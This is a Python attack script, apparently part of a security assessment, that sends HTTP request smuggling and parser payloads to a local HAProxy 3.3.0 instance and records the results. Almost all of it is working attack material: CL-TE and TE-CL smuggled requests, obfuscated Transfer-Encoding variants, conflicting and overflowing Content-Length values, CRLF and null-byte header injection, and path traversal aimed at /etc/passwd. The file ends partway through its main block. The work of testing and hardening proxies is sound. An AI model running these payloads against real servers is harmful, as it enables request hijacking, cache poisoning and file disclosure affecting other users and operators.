#!/usr/bin/env python3
"""
Phase 2: HTTP/1.1 Request Smuggling & Parser Attack Script
Target: HAProxy v3.3.0 on 127.0.0.1:8180 (HTTP) / 8888 (TCP passthrough)
Backend: Echo server on 127.0.0.1:9090

Tests CL-TE, TE-CL, double CL, chunked edge cases, header injection,
method/URI parsing, and Content-Type handling.
"""

import socket
import ssl
import json
import time
import sys
import os
import traceback

# Evidence collection
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/HAProxy/evidence"
EVIDENCE_FILE = os.path.join(EVIDENCE_DIR, "phase2_h1_smuggling.json")

class EvidenceCollector:
    def __init__(self):
        self.findings = []
        self.tests = []
        self.test_count = 0
        self.anomaly_count = 0
        self.finding_count = 0

    def add_test(self, category, name, result, details="", severity=None):
        self.test_count += 1
        entry = {
            "id": self.test_count,
            "category": category,
            "name": name,
            "result": result,
            "details": details,
            "timestamp": time.time()
        }
        if severity:
            entry["severity"] = severity
        self.tests.append(entry)

        if result == "ANOMALY":
            self.anomaly_count += 1
        elif result in ("VULNERABLE", "FINDING"):
            self.finding_count += 1
            self.findings.append(entry)

        status = f"[{result}]"
        sev = f" ({severity})" if severity else ""
        print(f"  {status:14s} {category}/{name}{sev}")
        if details and result in ("VULNERABLE", "FINDING", "ANOMALY"):
            for line in details.split("\n")[:3]:
                print(f"               {line}")

    def save(self):
        data = {
            "phase": "Phase 2: HTTP/1.1 Request Smuggling & Parser Attacks",
            "target": "HAProxy v3.3.0",
            "timestamp": time.time(),
            "summary": {
                "total_tests": self.test_count,
                "anomalies": self.anomaly_count,
                "findings": self.finding_count
            },
            "findings": self.findings,
            "tests": self.tests
        }
        with open(EVIDENCE_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"\n[*] Evidence saved: {EVIDENCE_FILE}")
        print(f"    Tests: {self.test_count} | Anomalies: {self.anomaly_count} | Findings: {self.finding_count}")

evidence = EvidenceCollector()

# --- Network helpers ---

def raw_send(host, port, data, timeout=5, read_timeout=3):
    """Send raw bytes and return response."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        if isinstance(data, str):
            data = data.encode()
        sock.sendall(data)
        time.sleep(0.1)

        response = b""
        sock.settimeout(read_timeout)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        sock.close()
        return response
    except Exception as e:
        return f"ERROR: {e}".encode()

def raw_send_pipeline(host, port, data_list, timeout=5, read_timeout=3):
    """Send multiple requests on same connection, return all responses."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        for data in data_list:
            if isinstance(data, str):
                data = data.encode()
            sock.sendall(data)
            time.sleep(0.05)

        response = b""
        sock.settimeout(read_timeout)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        sock.close()
        return response
    except Exception as e:
        return f"ERROR: {e}".encode()

def raw_send_keepalive(host, port, requests, timeout=5, read_timeout=2):
    """Send requests on a keep-alive connection, collect individual responses."""
    responses = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        for req in requests:
            if isinstance(req, str):
                req = req.encode()
            sock.sendall(req)
            time.sleep(0.2)

            resp = b""
            sock.settimeout(read_timeout)
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    # Simple HTTP response boundary detection
                    if b"\r\n\r\n" in resp and b"Content-Length" in resp:
                        # Try to determine if full response received
                        try:
                            headers_end = resp.index(b"\r\n\r\n") + 4
                            cl_start = resp.lower().index(b"content-length:") + 15
                            cl_end = resp.index(b"\r\n", cl_start)
                            cl = int(resp[cl_start:cl_end].strip())
                            if len(resp) >= headers_end + cl:
                                break
                        except (ValueError, IndexError):
                            pass
            except socket.timeout:
                pass
            responses.append(resp)

        sock.close()
    except Exception as e:
        responses.append(f"ERROR: {e}".encode())
    return responses

HOST = "127.0.0.1"
HTTP_PORT = 8180
TCP_PORT = 8888
HTTPS_PORT = 8443

# ============================================================
# Category 1: CL-TE Smuggling
# ============================================================
def test_cl_te_smuggling():
    print("\n[*] Category 1: CL-TE Smuggling")

    # Test 1.1: Basic CL-TE conflict
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp or b"Bad Request" in resp:
        evidence.add_test("CL-TE", "basic_cl_te_conflict", "SAFE",
                         "HAProxy rejects CL+TE conflict")
    elif b"200" in resp:
        evidence.add_test("CL-TE", "basic_cl_te_conflict", "ANOMALY",
                         f"Response accepted: {resp[:200]}", "HIGH")
    else:
        evidence.add_test("CL-TE", "basic_cl_te_conflict", "SAFE",
                         f"Response: {resp[:100]}")

    # Test 1.2: CL-TE with smuggled request
    smuggle = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Content-Length: 30\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /smuggled HTTP/1.1\r\n"
        "Host: evil\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, smuggle)
    if b"smuggled" in resp.lower():
        evidence.add_test("CL-TE", "smuggled_request", "VULNERABLE",
                         f"Smuggled request reached backend! Response: {resp[:300]}",
                         "CRITICAL")
    elif b"400" in resp:
        evidence.add_test("CL-TE", "smuggled_request", "SAFE",
                         "Request rejected (400)")
    else:
        evidence.add_test("CL-TE", "smuggled_request", "SAFE",
                         f"Response: {resp[:200]}")

    # Test 1.3: CL-TE with obfuscated TE
    for te_variant in [
        "Transfer-Encoding: chunked",
        "Transfer-Encoding:chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: Chunked",
        "Transfer-Encoding: CHUNKED",
        "Transfer-encoding: chunked",
        "transfer-encoding: chunked",
        "Transfer-Encoding: chunked\x00",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding: \r\n chunked",  # obs-fold
        "X-Foo: bar\r\nTransfer-Encoding: chunked",
    ]:
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: 127.0.0.1:8180\r\n"
            f"Content-Length: 6\r\n"
            f"{te_variant}\r\n"
            f"\r\n"
            f"0\r\n\r\n"
        )
        resp = raw_send(HOST, HTTP_PORT, payload)
        safe_variant = te_variant.replace('\r', '\\r').replace('\n', '\\n').replace('\t', '\\t').replace('\x00', '\\x00')
        if b"200" in resp and b"smuggled" not in resp:
            evidence.add_test("CL-TE", f"obfuscated_te({safe_variant[:40]})", "ANOMALY",
                             f"Request accepted with obfuscated TE: {safe_variant}")
        elif b"400" in resp:
            evidence.add_test("CL-TE", f"obfuscated_te({safe_variant[:40]})", "SAFE",
                             "Rejected")
        else:
            evidence.add_test("CL-TE", f"obfuscated_te({safe_variant[:40]})", "SAFE",
                             f"Response: {resp[:100]}")

# ============================================================
# Category 2: TE-CL Smuggling
# ============================================================
def test_te_cl_smuggling():
    print("\n[*] Category 2: TE-CL Smuggling")

    # Test 2.1: Basic TE-CL
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "12\r\n"
        "GPOST / HTTP/1.1\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"GPOST" in resp:
        evidence.add_test("TE-CL", "basic_te_cl_smuggle", "VULNERABLE",
                         f"Smuggled GPOST seen in response: {resp[:300]}", "CRITICAL")
    elif b"400" in resp:
        evidence.add_test("TE-CL", "basic_te_cl_smuggle", "SAFE", "Rejected (400)")
    else:
        evidence.add_test("TE-CL", "basic_te_cl_smuggle", "SAFE",
                         f"Response: {resp[:200]}")

    # Test 2.2: TE-TE conflict (different encodings)
    for te_pair in [
        ("Transfer-Encoding: chunked\r\nTransfer-Encoding: identity", "chunked+identity"),
        ("Transfer-Encoding: chunked\r\nTransfer-Encoding: compress", "chunked+compress"),
        ("Transfer-Encoding: chunked, identity", "chunked,identity"),
        ("Transfer-Encoding: identity, chunked", "identity,chunked"),
        ("Transfer-Encoding: chunked\r\nTransfer-encoding: identity", "mixed-case-dup"),
    ]:
        te_header, label = te_pair
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: 127.0.0.1:8180\r\n"
            f"{te_header}\r\n"
            f"\r\n"
            f"5\r\n"
            f"hello\r\n"
            f"0\r\n"
            f"\r\n"
        )
        resp = raw_send(HOST, HTTP_PORT, payload)
        if b"400" in resp or b"501" in resp:
            evidence.add_test("TE-CL", f"te_conflict({label})", "SAFE", "Rejected")
        else:
            evidence.add_test("TE-CL", f"te_conflict({label})", "ANOMALY",
                             f"Accepted: {resp[:150]}")

# ============================================================
# Category 3: Double Content-Length
# ============================================================
def test_double_content_length():
    print("\n[*] Category 3: Double Content-Length")

    # Test 3.1: Two different CL values
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Content-Length: 5\r\n"
        "Content-Length: 100\r\n"
        "\r\n"
        "hello"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Double-CL", "different_values", "SAFE", "Rejected (400)")
    else:
        evidence.add_test("Double-CL", "different_values", "ANOMALY",
                         f"Accepted with conflicting CL: {resp[:200]}", "HIGH")

    # Test 3.2: Same CL value duplicated
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Content-Length: 5\r\n"
        "Content-Length: 5\r\n"
        "\r\n"
        "hello"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Double-CL", "same_values", "SAFE", "Rejected (400)")
    elif b"200" in resp:
        evidence.add_test("Double-CL", "same_values", "ANOMALY",
                         "Accepted duplicate CL (same value) - may cause backend confusion")
    else:
        evidence.add_test("Double-CL", "same_values", "SAFE", f"Response: {resp[:100]}")

    # Test 3.3: CL with leading zeros
    for cl_val in ["005", "0005", "00000000000000005", "5 ", " 5", "+5", "05"]:
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: 127.0.0.1:8180\r\n"
            f"Content-Length: {cl_val}\r\n"
            f"\r\n"
            f"hello"
        )
        resp = raw_send(HOST, HTTP_PORT, payload)
        if b"200" in resp:
            evidence.add_test("Double-CL", f"cl_format({cl_val.strip()})", "ANOMALY",
                             f"Accepted CL={cl_val!r}")
        elif b"400" in resp:
            evidence.add_test("Double-CL", f"cl_format({cl_val.strip()})", "SAFE", "Rejected")
        else:
            evidence.add_test("Double-CL", f"cl_format({cl_val.strip()})", "SAFE",
                             f"Response: {resp[:100]}")

    # Test 3.4: Empty Content-Length (CVE-2023-40225 regression)
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Content-Length: \r\n"
        "\r\n"
        "hello"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Double-CL", "empty_content_length_cve2023_40225", "SAFE",
                         "Rejected - CVE-2023-40225 patched")
    elif b"200" in resp:
        evidence.add_test("Double-CL", "empty_content_length_cve2023_40225", "VULNERABLE",
                         f"Empty CL accepted! CVE-2023-40225 regression: {resp[:200]}",
                         "CRITICAL")
    else:
        evidence.add_test("Double-CL", "empty_content_length_cve2023_40225", "SAFE",
                         f"Response: {resp[:100]}")

    # Test 3.5: Negative Content-Length
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Content-Length: -1\r\n"
        "\r\n"
        "hello"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Double-CL", "negative_cl", "SAFE", "Rejected")
    else:
        evidence.add_test("Double-CL", "negative_cl", "ANOMALY",
                         f"Negative CL accepted: {resp[:200]}", "HIGH")

    # Test 3.6: Very large Content-Length (CVE-2021-40346 regression)
    for cl_val in ["99999999999999999999", "18446744073709551615",
                   "18446744073709551616", "9999999999999999999999999999"]:
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: 127.0.0.1:8180\r\n"
            f"Content-Length: {cl_val}\r\n"
            f"\r\n"
            f"hello"
        )
        resp = raw_send(HOST, HTTP_PORT, payload)
        if b"400" in resp:
            evidence.add_test("Double-CL", f"overflow_cl({cl_val[:20]})", "SAFE",
                             "Rejected - integer overflow handled")
        elif b"200" in resp:
            evidence.add_test("Double-CL", f"overflow_cl({cl_val[:20]})", "VULNERABLE",
                             f"Large CL accepted! CVE-2021-40346 regression", "CRITICAL")
        else:
            evidence.add_test("Double-CL", f"overflow_cl({cl_val[:20]})", "SAFE",
                             f"Response: {resp[:100]}")

# ============================================================
# Category 4: Chunked Encoding Edge Cases
# ============================================================
def test_chunked_edge_cases():
    print("\n[*] Category 4: Chunked Encoding Edge Cases")

    # Test 4.1: Chunk size with trailing whitespace
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5 \r\n"
        "hello\r\n"
        "0\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"200" in resp:
        evidence.add_test("Chunked", "trailing_space_in_size", "ANOMALY",
                         "Chunk size with trailing space accepted")
    else:
        evidence.add_test("Chunked", "trailing_space_in_size", "SAFE",
                         f"Response: {resp[:100]}")

    # Test 4.2: Chunk extensions (;key=value)
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5;ext=val\r\n"
        "hello\r\n"
        "0\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    evidence.add_test("Chunked", "chunk_extension",
                     "SAFE" if b"200" in resp else "ANOMALY",
                     "Chunk extensions handled per RFC" if b"200" in resp else f"Response: {resp[:100]}")

    # Test 4.3: Invalid hex in chunk size
    for bad_size in ["0x5", "5g", "5;", "hello", "-5", "FFFFFFFFFFFFFFFF"]:
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: 127.0.0.1:8180\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{bad_size}\r\n"
            f"hello\r\n"
            f"0\r\n"
            f"\r\n"
        )
        resp = raw_send(HOST, HTTP_PORT, payload)
        if b"200" in resp and bad_size in ("-5", "hello", "0x5"):
            evidence.add_test("Chunked", f"invalid_hex({bad_size})", "ANOMALY",
                             f"Invalid chunk size accepted: {bad_size}", "MEDIUM")
        elif b"400" in resp:
            evidence.add_test("Chunked", f"invalid_hex({bad_size})", "SAFE", "Rejected")
        else:
            evidence.add_test("Chunked", f"invalid_hex({bad_size})", "SAFE",
                             f"Response: {resp[:100]}")

    # Test 4.4: Very large chunk size (integer overflow)
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "FFFFFFFFFFFFFFFF\r\n"
        "hello\r\n"
        "0\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    evidence.add_test("Chunked", "max_chunk_size",
                     "SAFE" if b"400" in resp or b"ERROR" in resp else "ANOMALY",
                     f"Response: {resp[:100]}")

    # Test 4.5: Missing final CRLF
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5\r\n"
        "hello\r\n"
        "0\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    evidence.add_test("Chunked", "missing_final_crlf",
                     "ANOMALY" if b"200" in resp else "SAFE",
                     f"Response: {resp[:100]}")

    # Test 4.6: Chunk size with leading zeros
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "00005\r\n"
        "hello\r\n"
        "0\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    evidence.add_test("Chunked", "leading_zeros",
                     "SAFE" if b"200" in resp else "ANOMALY",
                     f"Response: {resp[:100]}")

    # Test 4.7: Double chunked encoding
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5\r\n"
        "hello\r\n"
        "0\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Chunked", "double_chunked_te", "SAFE", "Rejected duplicate TE")
    else:
        evidence.add_test("Chunked", "double_chunked_te", "ANOMALY",
                         f"Duplicate TE:chunked accepted: {resp[:100]}")

# ============================================================
# Category 5: Header Injection
# ============================================================
def test_header_injection():
    print("\n[*] Category 5: Header Injection")

    # Test 5.1: CRLF injection in header value
    payload = (
        "GET / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "X-Test: value\r\nInjected: header\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"injected" in resp.lower():
        evidence.add_test("Header-Injection", "crlf_in_value", "VULNERABLE",
                         f"CRLF injection successful! {resp[:200]}", "HIGH")
    elif b"400" in resp:
        evidence.add_test("Header-Injection", "crlf_in_value", "SAFE", "Rejected")
    else:
        evidence.add_test("Header-Injection", "crlf_in_value", "SAFE",
                         f"Response: {resp[:100]}")

    # Test 5.2: Null byte in header value
    payload = b"GET / HTTP/1.1\r\nHost: 127.0.0.1:8180\r\nX-Test: before\x00after\r\n\r\n"
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Header-Injection", "null_in_value", "SAFE", "Rejected")
    elif b"after" in resp:
        evidence.add_test("Header-Injection", "null_in_value", "ANOMALY",
                         "Null byte in header value passed through", "MEDIUM")
    else:
        evidence.add_test("Header-Injection", "null_in_value", "SAFE",
                         f"Response: {resp[:100]}")

    # Test 5.3: Null byte in header name
    payload = b"GET / HTTP/1.1\r\nHost: 127.0.0.1:8180\r\nX-Te\x00st: value\r\n\r\n"
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Header-Injection", "null_in_name", "SAFE", "Rejected")
    else:
        evidence.add_test("Header-Injection", "null_in_name", "ANOMALY",
                         f"Null byte in header name accepted: {resp[:100]}", "MEDIUM")

    # Test 5.4: Empty header name (CVE-2023-25725 regression)
    payload = b"GET / HTTP/1.1\r\nHost: 127.0.0.1:8180\r\n: empty-name\r\n\r\n"
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Header-Injection", "empty_name_cve2023_25725", "SAFE",
                         "Rejected - CVE-2023-25725 patched")
    else:
        evidence.add_test("Header-Injection", "empty_name_cve2023_25725", "VULNERABLE",
                         f"Empty header name accepted! CVE-2023-25725 regression: {resp[:200]}",
                         "CRITICAL")

    # Test 5.5: Header line folding (obs-fold)
    payload = (
        "GET / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "X-Test: line1\r\n"
        " continued\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Header-Injection", "obs_fold", "SAFE",
                         "Header folding rejected")
    else:
        evidence.add_test("Header-Injection", "obs_fold", "ANOMALY",
                         f"Header folding accepted (potential smuggling vector)")

    # Test 5.6: Oversized header value
    long_value = "A" * 16384
    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: 127.0.0.1:8180\r\n"
        f"X-Long: {long_value}\r\n"
        f"\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp or b"413" in resp or b"431" in resp:
        evidence.add_test("Header-Injection", "oversized_header", "SAFE",
                         "Oversized header rejected")
    else:
        evidence.add_test("Header-Injection", "oversized_header", "ANOMALY",
                         f"16KB header accepted: {resp[:100]}")

    # Test 5.7: Many headers
    headers = "\r\n".join([f"X-Header-{i}: value-{i}" for i in range(200)])
    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: 127.0.0.1:8180\r\n"
        f"{headers}\r\n"
        f"\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp or b"431" in resp:
        evidence.add_test("Header-Injection", "many_headers(200)", "SAFE",
                         "Too many headers rejected")
    else:
        evidence.add_test("Header-Injection", "many_headers(200)", "ANOMALY",
                         f"200 headers accepted: {resp[:100]}")

    # Test 5.8: Space before colon in header
    payload = (
        "GET / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "X-Test : value\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Header-Injection", "space_before_colon", "SAFE",
                         "Rejected per RFC 7230")
    else:
        evidence.add_test("Header-Injection", "space_before_colon", "ANOMALY",
                         "Space before colon accepted (RFC violation)")

    # Test 5.9: Tab in header name
    payload = b"GET / HTTP/1.1\r\nHost: 127.0.0.1:8180\r\nX-Te\tst: value\r\n\r\n"
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Header-Injection", "tab_in_name", "SAFE", "Rejected")
    else:
        evidence.add_test("Header-Injection", "tab_in_name", "ANOMALY",
                         f"Tab in header name accepted: {resp[:100]}")

    # Test 5.10: Connection header smuggling
    payload = (
        "GET / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Connection: keep-alive, Transfer-Encoding\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    evidence.add_test("Header-Injection", "connection_te_smuggle",
                     "ANOMALY" if b"200" in resp else "SAFE",
                     f"TE in Connection header: {resp[:100]}")

# ============================================================
# Category 6: Method/URI Parsing
# ============================================================
def test_method_uri_parsing():
    print("\n[*] Category 6: Method/URI Parsing")

    # Test 6.1: HTTP/0.9 request
    payload = b"GET /\r\n"
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Method-URI", "http09_request", "SAFE",
                         "HTTP/0.9 rejected")
    else:
        evidence.add_test("Method-URI", "http09_request", "ANOMALY",
                         f"HTTP/0.9 accepted: {resp[:100]}")

    # Test 6.2: Absolute-form URI
    payload = (
        "GET http://evil.com/ HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"evil.com" in resp:
        evidence.add_test("Method-URI", "absolute_uri_host_override", "ANOMALY",
                         "Absolute-form URI with different host accepted", "MEDIUM")
    else:
        evidence.add_test("Method-URI", "absolute_uri_host_override", "SAFE",
                         f"Response: {resp[:100]}")

    # Test 6.3: Fragment in URI
    payload = (
        "GET /#fragment HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"fragment" in resp:
        evidence.add_test("Method-URI", "fragment_in_uri", "ANOMALY",
                         "Fragment passed to backend")
    else:
        evidence.add_test("Method-URI", "fragment_in_uri", "SAFE",
                         "Fragment stripped or rejected")

    # Test 6.4: Path traversal
    for path in ["/../etc/passwd", "/..%2f..%2fetc/passwd", "/%2e%2e/etc/passwd",
                  "/static/../../etc/passwd", "/.%00./"]:
        payload = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: 127.0.0.1:8180\r\n"
            f"\r\n"
        )
        resp = raw_send(HOST, HTTP_PORT, payload)
        safe_path = path.replace('\x00', '\\x00')
        if b"root:" in resp:
            evidence.add_test("Method-URI", f"path_traversal({safe_path})", "VULNERABLE",
                             "Path traversal successful!", "CRITICAL")
        elif b"400" in resp:
            evidence.add_test("Method-URI", f"path_traversal({safe_path})", "SAFE", "Rejected")
        else:
            evidence.add_test("Method-URI", f"path_traversal({safe_path})", "SAFE",
                             f"Forwarded but no file access: {resp[:80]}")

    # Test 6.5: Unusual HTTP methods
    for method in ["CONNECT", "TRACE", "TRACK", "DEBUG", "PROPFIND", "GPOST"]:
        payload = (
            f"{method} / HTTP/1.1\r\n"
            f"Host: 127.0.0.1:8180\r\n"
            f"\r\n"
        )
        resp = raw_send(HOST, HTTP_PORT, payload)
        evidence.add_test("Method-URI", f"method_{method}",
                         "ANOMALY" if b"200" in resp and method in ("CONNECT", "TRACE", "TRACK", "DEBUG") else "SAFE",
                         f"Method {method}: {'Accepted' if b'200' in resp else 'Rejected'}")

    # Test 6.6: Whitespace in URI
    payload = b"GET /path with spaces HTTP/1.1\r\nHost: 127.0.0.1:8180\r\n\r\n"
    resp = raw_send(HOST, HTTP_PORT, payload)
    if b"400" in resp:
        evidence.add_test("Method-URI", "space_in_uri", "SAFE", "Rejected")
    else:
        evidence.add_test("Method-URI", "space_in_uri", "ANOMALY",
                         f"Space in URI accepted: {resp[:100]}")

    # Test 6.7: HTTP version parsing
    for version in ["HTTP/1.2", "HTTP/2.0", "HTTP/0.9", "HTTP/1.10", "HTTP/9.9"]:
        payload = (
            f"GET / {version}\r\n"
            f"Host: 127.0.0.1:8180\r\n"
            f"\r\n"
        )
        resp = raw_send(HOST, HTTP_PORT, payload)
        evidence.add_test("Method-URI", f"http_version({version})",
                         "ANOMALY" if b"200" in resp and version not in ("HTTP/1.0", "HTTP/1.1") else "SAFE",
                         f"Version {version}: {'Accepted' if b'200' in resp else 'Rejected'}")

# ============================================================
# Category 7: Request Smuggling via TCP passthrough
# ============================================================
def test_tcp_passthrough_smuggling():
    print("\n[*] Category 7: TCP Passthrough Smuggling")

    # Through TCP mode, HAProxy doesn't parse HTTP — test if raw smuggling reaches backend
    # Test 7.1: Raw CL-TE through TCP passthrough
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n\r\n"
    )
    resp = raw_send(HOST, TCP_PORT, payload)
    evidence.add_test("TCP-Pass", "cl_te_passthrough",
                     "ANOMALY" if b"200" in resp else "SAFE",
                     f"TCP passthrough CL-TE: {resp[:100]}")

    # Test 7.2: Double request through TCP
    payload = (
        "GET / HTTP/1.1\r\nHost: a\r\n\r\n"
        "GET /second HTTP/1.1\r\nHost: b\r\n\r\n"
    )
    resp = raw_send(HOST, TCP_PORT, payload)
    if b"second" in resp:
        evidence.add_test("TCP-Pass", "pipeline_through_tcp", "ANOMALY",
                         "Pipelined requests forwarded through TCP mode")
    else:
        evidence.add_test("TCP-Pass", "pipeline_through_tcp", "SAFE",
                         f"Response: {resp[:100]}")

# ============================================================
# Category 8: Content-Type & Special Headers
# ============================================================
def test_content_type_headers():
    print("\n[*] Category 8: Content-Type & Special Headers")

    # Test 8.1: Transfer-Encoding with extra whitespace/junk
    te_payloads = [
        ("chunked ", "trailing_space"),
        (" chunked", "leading_space"),
        ("chunked\t", "trailing_tab"),
        ("chunked;q=1.0", "quality"),
        ("chunked\r\n ", "obs_fold"),
    ]
    for te_val, label in te_payloads:
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: 127.0.0.1:8180\r\n"
            f"Transfer-Encoding: {te_val}\r\n"
            f"\r\n"
            f"5\r\n"
            f"hello\r\n"
            f"0\r\n"
            f"\r\n"
        )
        resp = raw_send(HOST, HTTP_PORT, payload)
        if b"200" in resp:
            evidence.add_test("Content-Type", f"te_variant({label})", "ANOMALY",
                             f"TE variant accepted: {te_val!r}")
        else:
            evidence.add_test("Content-Type", f"te_variant({label})", "SAFE",
                             f"Rejected: {resp[:80]}")

    # Test 8.2: Hop-by-hop header smuggling
    for hdr in ["Connection", "Proxy-Connection", "Keep-Alive",
                "Transfer-Encoding", "Up[REDACTED]", "Proxy-Authenticate"]:
        payload = (
            f"GET / HTTP/1.1\r\n"
            f"Host: 127.0.0.1:8180\r\n"
            f"{hdr}: test-value\r\n"
            f"\r\n"
        )
        resp = raw_send(HOST, HTTP_PORT, payload)
        if b"test-value" in resp and hdr.lower() in resp.decode(errors='replace').lower():
            evidence.add_test("Content-Type", f"hop_by_hop({hdr})", "ANOMALY",
                             f"Hop-by-hop header {hdr} forwarded to backend")
        else:
            evidence.add_test("Content-Type", f"hop_by_hop({hdr})", "SAFE",
                             f"Header {hdr} stripped or rejected")

    # Test 8.3: Up[REDACTED] header handling
    payload = (
        "GET / HTTP/1.1\r\n"
        "Host: 127.0.0.1:8180\r\n"
        "Up[REDACTED]: websocket\r\n"
        "Connection: Up[REDACTED]\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    resp = raw_send(HOST, HTTP_PORT, payload)
    evidence.add_test("Content-Type", "websocket_up[REDACTED]",
                     "SAFE", f"WebSocket up[REDACTED]: {resp[:100]}")

# ============================================================
# Main
# ============================================================
if __name__ == "__main__":
    print("=" * 70)
    print("Phase 2: HTTP/1.1 Request Smuggling & Parser Attacks")
    print(f"Target: HAProxy v3.3.0 @ {HOST}:{HTTP_PORT}")
    print("=" * 70)

    try:
        test_cl_te_smuggling()
        test_te_cl_smuggling()
        test_double_content_length()
